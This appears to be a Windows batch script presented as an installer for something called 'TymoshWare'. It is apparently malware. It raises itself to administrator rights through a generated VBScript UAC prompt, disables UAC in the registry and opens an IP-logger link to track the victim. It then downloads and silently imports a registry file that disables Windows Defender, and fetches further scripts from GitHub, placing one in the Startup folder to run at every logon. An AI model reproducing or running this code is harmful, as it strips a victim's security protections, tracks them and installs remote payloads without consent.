@echo off

echo(Installing TymoshWare

    IF "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
>nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
) ELSE (
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
)

if '%errorlevel%' NEQ '0' (
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params= %*
    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params:"=""%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"

:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"
    
reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f    

start https://iplogger.com/24VFy6

cd C:\Program Files

mkdir TymoshWare
cd TymoshWare

curl -o disableDefender.reg https://raw.githubusercontent.com/smartpandapl/TymoshWare/main/disableDefender.reg
regedit /s disableDefender.reg

curl -o background.cmd https://raw.githubusercontent.com/smartpandapl/TymoshWare/main/background.bat
curl -o autostart.cmd https://raw.githubusercontent.com/smartpandapl/TymoshWare/main/autostart.cmd
xcopy autostart.cmd C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup



